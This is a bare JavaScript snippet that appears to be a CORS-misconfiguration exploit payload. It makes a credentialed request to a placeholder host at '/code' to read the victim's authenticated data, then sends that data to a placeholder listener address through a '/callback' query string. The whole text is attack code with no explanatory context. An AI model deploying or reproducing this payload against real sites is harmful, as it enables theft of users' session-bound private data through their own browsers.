        fetch("https://<IP>/code",{
                mode:"cors",
                method:"get",
                credentials:"include"
        })
        .then(response => response.json())
        .then(data => {
                fetch("http://<LISTENER>/callback?" + encodeURIComponent(JSON.stringify(data)), {
                        mode: "no-cors"
                })
        })
